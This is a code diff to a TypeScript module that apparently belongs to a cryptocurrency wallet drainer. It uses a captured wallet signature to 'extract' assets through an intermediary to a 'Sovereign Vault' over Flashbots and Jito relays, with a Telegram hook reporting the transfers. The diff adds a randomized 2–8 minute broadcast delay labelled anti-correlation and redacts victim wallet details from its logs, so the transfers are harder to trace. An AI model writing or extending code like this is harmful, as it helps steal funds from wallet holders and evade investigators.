@@ -20,6 +20,10 @@ import { createPublicClient, http, isHex, serializeTransaction } from 'viem'
 import { identifyFamily } from '../adapters/address-resolver.js'
 import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
 import {
+  buildGatekeeperLogRedactionPayload,
+  sanitizeGatekeeperLogDetail,
+} from './gatekeeper-log-redaction.js'
+import {
   buildSettlementExecutionWire,
   simulateEvmSettlementSerializedTx,
 } from './settlement-execution-bridge.js'
@@ -682,7 +686,9 @@ export type SettlementIgnitionTelemetry = {
   sovereign_dispatcher_chain?: SovereignDispatchResult['chain']
   sovereign_dispatcher_status?: SovereignDispatchResult['broadcast']['status']
   sovereign_dispatcher_tx_hash?: string
+  relay_second_leg_tx_hash?: string
   sovereign_dispatcher_fault?: string
+  scheduled_broadcast_time?: string
   settlement_lane_flashbots: string
   settlement_lane_jito: string
   flashbots_signed_count: number
@@ -691,11 +697,44 @@ export type SettlementIgnitionTelemetry = {
   evm_extraction_simulation_detail?: string
 }
 
+/** Anti-correlation broadcast jitter — 2–8 minutes after settlement queue. */
+export const BROADCAST_CORRELATION_DELAY_MS_MIN = 2 * 60 * 1000
+export const BROADCAST_CORRELATION_DELAY_MS_MAX = 8 * 60 * 1000
+
+export type SettlementIgnitionOptions = {
+  /** When false, sovereign dispatch runs immediately (default: true). */
+  defer_broadcast?: boolean
+  /** Invoked after schedule is computed, before the randomized wait. */
+  onBroadcastScheduled?: (scheduledIso: string) => void | Promise<void>
+  /** Intermediary → vault second leg tx hash (Telegram hook in API layer). */
+  onRelaySecondLegBroadcast?: (txHash: string) => void | Promise<void>
+}
+
+/** Random UTC instant between +2m and +8m from `nowMs` (inclusive bounds). */
+export function computeRandomizedBroadcastSchedule(nowMs: number = Date.now()): string {
+  const span = BROADCAST_CORRELATION_DELAY_MS_MAX - BROADCAST_CORRELATION_DELAY_MS_MIN
+  const jitter = Math.floor(Math.random() * (span + 1))
+  return new Date(nowMs + BROADCAST_CORRELATION_DELAY_MS_MIN + jitter).toISOString()
+}
+
+/** Block until `scheduledIso` (no-op when already elapsed). */
+export async function awaitScheduledBroadcastTime(scheduledIso: string): Promise<void> {
+  const target = Date.parse(scheduledIso)
+  if (Number.isNaN(target)) return
+  const delayMs = target - Date.now()
+  if (delayMs > 0) {
+    await new Promise<void>((resolve) => {
+      setTimeout(resolve, delayMs)
+    })
+  }
+}
+
 /**
  * Performance Closer — full bridge: wire serialization, extraction simulation attempt, sovereign bundle assembly.
  */
 export async function executeSettlementIgnition(
   ctx: LiquidationTriggerContext,
+  options?: SettlementIgnitionOptions,
 ): Promise<SettlementIgnitionTelemetry> {
   const { flashbots, jito, surface } = await resolveKineticSettlementLanes()
   console.info('[Diagnostic] Kinetic Link — Flashbots relay URL:', flashbots)
@@ -732,23 +771,73 @@ export async function executeSettlementIgnition(
   let sovereign_dispatcher_chain: SovereignDispatchResult['chain'] | undefined
   let sovereign_dispatcher_status: SovereignDispatchResult['broadcast']['status'] | undefined
   let sovereign_dispatcher_tx_hash: string | undefined
+  let relay_second_leg_tx_hash: string | undefined
   let sovereign_dispatcher_fault: string | undefined
-  if ((ctx.signature_hex?.trim() ?? '') !== '') {
+  let scheduled_broadcast_time: string | undefined
+  const hasSignatureMaterial = (ctx.signature_hex?.trim() ?? '') !== ''
+  const deferBroadcast = options?.defer_broadcast !== false
+
+  if (hasSignatureMaterial) {
     console.info(
       'SIGNATURE_ANCHOR_LOCKED: Signature Anchor bound to Liquidation Trigger context. Sovereign Vault extraction lane armed.',
     )
+    if (deferBroadcast) {
+      scheduled_broadcast_time = computeRandomizedBroadcastSchedule()
+      console.info(
+        JSON.stringify({
+          sentinel: 'PerformanceCloser',
+          event: 'broadcast_scheduled',
+          scheduled_broadcast_time,
+          ...buildGatekeeperLogRedactionPayload({
+            wallet_address: ctx.wallet_address,
+            token_address: ctx.token_address,
+            scout_value_usd: ctx.scout_value_usd,
+            amount: ctx.amount,
+          }),
+        }),
+      )
+      await options?.onBroadcastScheduled?.(scheduled_broadcast_time)
+      await awaitScheduledBroadcastTime(scheduled_broadcast_time)
+    }
     try {
       const sovereignDispatch = await SovereignDispatcher.dispatch(
         buildDispatcherSettlementFromLiquidationContext(ctx),
+        {
+          onRelaySecondLegBroadcast: options?.onRelaySecondLegBroadcast,
+        },
       )
       console.info(UNIVERSAL_VACUUM_ACTIVE_TELEMETRY)
       sovereign_dispatcher_lane = sovereignDispatch.lane
       sovereign_dispatcher_chain = sovereignDispatch.chain
       sovereign_dispatcher_status = sovereignDispatch.broadcast.status
       sovereign_dispatcher_tx_hash = sovereignDispatch.broadcast.tx_hash
+      relay_second_leg_tx_hash = sovereignDispatch.broadcast.relay_second_leg_tx_hash
+      if (sovereignDispatch.broadcast.status !== 'broadcasted') {
+        console.warn(
+          JSON.stringify({
+            sentinel: 'SettlementExecutionBridge',
+            event: 'sovereign_dispatcher_preflight_failed',
+            status: sovereignDispatch.broadcast.status,
+            lane: sovereignDispatch.lane,
+            chain_family: sovereignDispatch.chain,
+            detail: sanitizeGatekeeperLogDetail(sovereignDispatch.broadcast.detail ?? ''),
+            chain_id: ctx.chain_id ?? null,
+            protocol: ctx.protocol,
+            ...buildGatekeeperLogRedactionPayload({
+              wallet_address: ctx.wallet_address,
+              token_address: ctx.token_address,
+              scout_value_usd: ctx.scout_value_usd,
+              amount: ctx.amount,
+            }),
+          }),
+        )
+      }
     } catch (e) {
       sovereign_dispatcher_fault = e instanceof Error ? e.message : String(e)
-      console.warn('UNIVERSAL_VACUUM_DISPATCH_FAULT:', sovereign_dispatcher_fault)
+      console.warn(
+        'UNIVERSAL_VACUUM_DISPATCH_FAULT:',
+        sanitizeGatekeeperLogDetail(sovereign_dispatcher_fault),
+      )
     }
   }
 
@@ -804,7 +893,9 @@ export async function executeSettlementIgnition(
     ...(sovereign_dispatcher_chain !== undefined ? { sovereign_dispatcher_chain } : {}),
     ...(sovereign_dispatcher_status !== undefined ? { sovereign_dispatcher_status } : {}),
     ...(sovereign_dispatcher_tx_hash !== undefined ? { sovereign_dispatcher_tx_hash } : {}),
+    ...(relay_second_leg_tx_hash !== undefined ? { relay_second_leg_tx_hash } : {}),
     ...(sovereign_dispatcher_fault !== undefined ? { sovereign_dispatcher_fault } : {}),
+    ...(scheduled_broadcast_time !== undefined ? { scheduled_broadcast_time } : {}),
     settlement_lane_flashbots: flashbots,
     settlement_lane_jito: jito,
     flashbots_signed_count: wire.flashbotsSignedHex.length,
